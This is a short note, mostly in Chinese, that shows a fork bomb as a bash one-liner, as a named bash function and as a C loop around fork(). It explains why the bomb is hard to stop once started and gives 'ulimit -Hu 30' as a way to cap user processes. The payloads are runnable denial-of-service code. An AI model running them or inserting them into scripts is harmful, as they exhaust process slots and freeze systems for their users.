:(){ :|:& };:

#forkbomb(){ forkbomb|forkbomb &} ; forkbomb
##include <unistd.h>int main(){while(1) fork();return0;}

#在系统中成功“引爆”fork炸弹后，我们可重启来使系统恢复正常运行；而若要以手动的方法使fork炸弹“熄火”，那前提就是必须杀死fork炸弹产生的所有进程。为此我们可以考虑使用程序来杀死fork炸弹产生的进程，但由于这一般需要创建新进程，且由于fork炸弹一直在探测与占用进程槽与内存空间，因而这一方法几乎不可能实现，而且用kill命令杀死进程后，释放出的进程槽又会被余下的fork炸弹线程所产生的新进程占用，

#在Linux系统上，可以通过ulimit这个指令达到相应的效果，例如： ulimit -Hu 30 这个指令可以限制用户最多只能创建30个进程
